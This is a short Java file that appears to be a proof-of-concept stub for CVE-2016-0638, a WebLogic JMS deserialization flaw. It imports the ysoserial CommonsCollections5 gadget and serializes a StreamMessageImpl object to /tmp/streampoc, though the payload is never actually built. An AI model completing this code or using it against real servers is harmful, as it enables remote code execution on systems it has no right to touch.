package weblogic.jms.common;

import ysoserial.payloads.CommonsCollections5;

import javax.management.BadAttributeValueExpException;
import java.io.*;

public class CVE_2016_0638 {
    public static void main(String[] args) throws Exception{
        FileOutputStream fileOutputStream = new FileOutputStream("/tmp/streampoc");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        StreamMessageImpl message = new StreamMessageImpl();
        objectOutputStream.writeObject(message);
    }
}
